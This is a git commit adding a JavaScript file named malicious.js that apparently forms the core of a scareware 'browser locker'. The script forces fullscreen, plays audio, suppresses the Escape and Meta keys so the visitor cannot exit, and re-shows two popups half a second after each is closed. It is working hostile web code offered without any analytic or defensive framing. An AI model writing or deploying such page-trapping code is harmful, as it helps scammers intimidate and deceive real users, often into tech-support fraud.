c18d8ae85b8523052b7a2f4ddb3458731ab97646
team-pop-help-team <156067443+team-pop-help-team@users.noreply.github.com>
2024-01-20 01:26:46 -0600

    Add files via upload

---
+++ malicious.js
@@ -0,0 +1,55 @@
+
+let isFullScreen = false
+
+function goFullScreen() {
+    const element = document.documentElement;
+    if (element.requestFullscreen) {
+      element.requestFullscreen();
+      isFullScreen = true;
+    } else if (element.mozRequestFullScreen) {
+      element.mozRequestFullScreen();
+      isFullScreen = true;
+    } else if (element.webkitRequestFullscreen) {
+      element.webkitRequestFullscreen();
+      isFullScreen = true;
+    } else if (element.msRequestFullscreen) {
+      element.msRequestFullscreen();
+      isFullScreen = true;
+    }
+    document.getElementById("myAudio").play()
+    document.getElementById("fullscreen").style.display = "none"
+  }
+
+  document.addEventListener("keydown", function (event) {
+    if (isFullScreen && event.key === "Escape") {
+        event.preventDefault();
+    }
+    console.log(event.key);
+});
+
+
+const considerFirstPopup = () => {
+  document.getElementById("firstPopup").style.display = "none"
+  setTimeout(function() {
+    document.getElementById("firstPopup").style.display = "block";
+  }, 500);
+}
+const considerSecondPopup = () => {
+    document.getElementById("secondPopup").style.display = "none"
+    setTimeout(function() {
+      document.getElementById("secondPopup").style.display = "block";
+    }, 500);
+  }
+
+  document.addEventListener('keydown', function (e) {
+    if (e.key == 'Escape' || e.key == 'Meta') {
+      e.preventDefault();
+      console.log(key);
+    }
+  });
+
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && document.fullscreenElement) {
+      e.preventDefault();
+    }
+  });
